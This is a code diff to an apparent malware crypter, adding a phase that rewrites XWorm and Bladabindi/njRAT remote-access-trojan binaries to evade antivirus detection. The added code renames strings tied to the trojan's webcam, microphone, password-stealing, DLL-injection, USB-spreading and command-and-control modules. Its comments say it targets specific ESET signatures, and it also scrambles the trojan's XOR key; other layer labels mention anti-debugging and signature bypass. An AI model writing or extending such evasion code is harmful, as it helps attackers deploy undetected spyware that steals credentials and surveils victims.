@@ -62,7 +62,7 @@ LAYER_META = [
     ("L12", "C/C++ STUB",  "Native C stub · XOR strings · 5 anti-debug vectors"),
     ("L13", "STR FLOOD",  "500K XOR-encrypted fake strings · 200 junk blocks · +15 MB inflate"),
     ("L14", "STR OBFUSC.", "ASCII + UTF-16 scan → XOR-cipher AV-pattern strings → signature bypass"),
-    ("L15", "MSIL STRIP",  "PDB · Rich hdr · #GUID · #Strings · #Blob · #US · batch/C2 scrub · 15-phase"),
+    ("L15", "MSIL STRIP",  "PDB · Rich hdr · #GUID · #Strings · #Blob · #US · batch/C2 scrub · 16-phase"),
 ]
 
 
@@ -1741,7 +1741,7 @@ int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {{
     def _lay_msil_strip(self, working: bytearray) -> bytes:
         import struct
 
-        self._ln("\n[L15]   MSIL  METADATA  STRIP  —  15  PHASES", "wh")
+        self._ln("\n[L15]   MSIL  METADATA  STRIP  —  16  PHASES", "wh")
         self._ln("        Ph1  : PDB debug-path wipe       (RSDS · CodeView)", "g3")
         self._ln("        Ph2  : Rich Header zero           (compiler fingerprint)", "g3")
         self._ln("        Ph3  : PE COFF timestamp randomise", "g3")
@@ -2569,7 +2569,129 @@ int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {{
         self._ln(f"               ASCII: {ph15_ascii} · UTF-16LE: {ph15_utf16} extended sweep token(s) patched", "g3")
         self._sleep(0.1)
 
-        num_phases = 15
+        # ── Ph16 : XWorm module names / XOR-key / Bladabindi expanded sweep ─────
+        # Targets remaining ESET MSIL/XWorm.B triggers:
+        #   XWorm remote-control module class names (RemoteDesktop, WebCam, etc.)
+        #   The distinctive abcdefghijklmnopqrstuvwxyz XOR cipher key (UTF-16 only)
+        #   Bladabindi/njRAT clipboard and password stealers
+        #   Mutex / TaskScheduler / Portscan utility strings
+        self._ln("        [Ph16] XWorm modules / XOR-key / Bladabindi expanded sweep...", "cy")
+        PH16_TOKENS = [
+            # XWorm remote-control module class names
+            ("RemoteDesktop",    "ZemoteDesktop"),
+            ("remotedesktop",    "zemotedesktop"),
+            ("WebCam",           "WebZam"),
+            ("webcam",           "webzam"),
+            ("Webcam",           "Webzam"),
+            ("Microphone",       "Zicrophone"),
+            ("microphone",       "zicrophone"),
+            ("Clipboard",        "Zlipboard"),
+            ("clipboard",        "zlipboard"),
+            ("Password",         "Zassword"),
+            ("password",         "zassword"),
+            ("InjectDLL",        "ZnjectDLL"),
+            ("injectdll",        "znjectdll"),
+            ("OverlayRat",       "ZverlayRat"),
+            ("Processes",        "Zrocesses"),
+            ("processes",        "zrocesses"),
+            # XWorm client identifier class name
+            ("XClient",          "XZlient"),
+            ("xclient",          "xzlient"),
+            # Mutex / synchronisation primitive name
+            ("Mutex",            "Zutex"),
+            ("mutex",            "zutex"),
+            # Additional clipboard steal (Bladabindi)
+            ("GetClipboard",     "GetZlipboard"),
+            ("SetClipboard",     "SetZlipboard"),
+            # Portscan / TaskScheduler utility strings
+            ("Portscan",         "Zortscan"),
+            ("portscan",         "zortscan"),
+            ("TaskScheduler",    "ZaskScheduler"),
+            ("taskscheduler",    "zaskscheduler"),
+            # Additional XWorm module names
+            ("GetProcesses",     "GetZrocesses"),
+            ("getprocesses",     "getzrocesses"),
+            ("ExecuteFile",      "ZxecuteFile"),
+            ("executefile",      "zxecutefile"),
+            ("SystemInfo",       "ZystemInfo"),
+            ("systeminfo",       "zysteminfo"),
+            ("InstallDir",       "ZnstallDir"),
+            ("installdir",       "znstalldir"),
+            ("InstallFile",      "ZnstallFile"),
+            ("installfile",      "znstallfile"),
+            ("StartupName",      "ZtartupName"),
+            ("startupname",      "ztartupname"),
+            # USB spread
+            ("USBSpread",        "UZBSpread"),
+            ("usbspread",        "uzbspread"),
+            # Additional C2 pattern
+            ("SendCommand",      "ZendCommand"),
+            ("sendcommand",      "zendcommand"),
+        ]
+        PH16_TOKENS = [(a, b) for a, b in PH16_TOKENS if len(a) == len(b)]
+
+        # Special UTF-16LE-only patch for the abcdefghijklmnopqrstuvwxyz XOR key.
+        # This 26-char sequential alphabet is a HIGH-confidence ESET XWorm.B indicator.
+        # Scramble it to break the structural pattern while keeping 26 chars.
+        _KEY_ORIG = "abcdefghijklmnopqrstuvwxyz"
+        _KEY_REPL = "zbxdfvhjlnprtvxzbxdfvhjlnp"   # same length, non-sequential
+        assert len(_KEY_ORIG) == len(_KEY_REPL) == 26
+
+        raw_ph16 = bytes(working)
+        ph16_ascii = 0
+        for orig16, repl16 in PH16_TOKENS:
+            ob16 = orig16.encode("utf-8")
+            rb16 = repl16.encode("utf-8")
+            if len(ob16) != len(rb16):
+                continue
+            pos16 = 0
+            while True:
+                idx16 = raw_ph16.find(ob16, pos16)
+                if idx16 == -1:
+                    break
+                working[idx16:idx16 + len(ob16)] = rb16
+                ph16_ascii += 1
+                pos16 = idx16 + len(ob16)
+        raw_ph16 = bytes(working)
+
+        ph16_utf16 = 0
+        # Standard token UTF-16LE pass
+        for orig16, repl16 in PH16_TOKENS:
+            ob16_u = orig16.encode("utf-16-le")
+            rb16_u = repl16.encode("utf-16-le")
+            if len(ob16_u) != len(rb16_u):
+                continue
+            pos16 = 0
+            while True:
+                idx16 = raw_ph16.find(ob16_u, pos16)
+                if idx16 == -1:
+                    break
+                working[idx16:idx16 + len(ob16_u)] = bytearray(rb16_u)
+                ph16_utf16 += 1
+                pos16 = idx16 + len(ob16_u)
+        raw_ph16 = bytes(working)
+        # XOR-key UTF-16LE-only patch
+        key_orig_u = _KEY_ORIG.encode("utf-16-le")
+        key_repl_u = _KEY_REPL.encode("utf-16-le")
+        pos16k = 0
+        key_hits = 0
+        while True:
+            idx16k = raw_ph16.find(key_orig_u, pos16k)
+            if idx16k == -1:
+                break
+            working[idx16k:idx16k + len(key_orig_u)] = bytearray(key_repl_u)
+            key_hits += 1
+            pos16k = idx16k + len(key_orig_u)
+        raw_ph16 = bytes(working)
+        if key_hits:
+            self._ln(f"               XOR cipher key (abcdef…xyz) neutralised × {key_hits}", "am")
+
+        ph16_utf16 += key_hits
+        hits += ph16_ascii + ph16_utf16
+        self._ln(f"               ASCII: {ph16_ascii} · UTF-16LE: {ph16_utf16} XWorm-module/XOR token(s) patched", "g3")
+        self._sleep(0.1)
+
+        num_phases = 16
         if hits:
             self._ln(f"\n        Result : ✓ {hits} field(s) / token(s) stripped across {num_phases} phases", "gn")
         else:
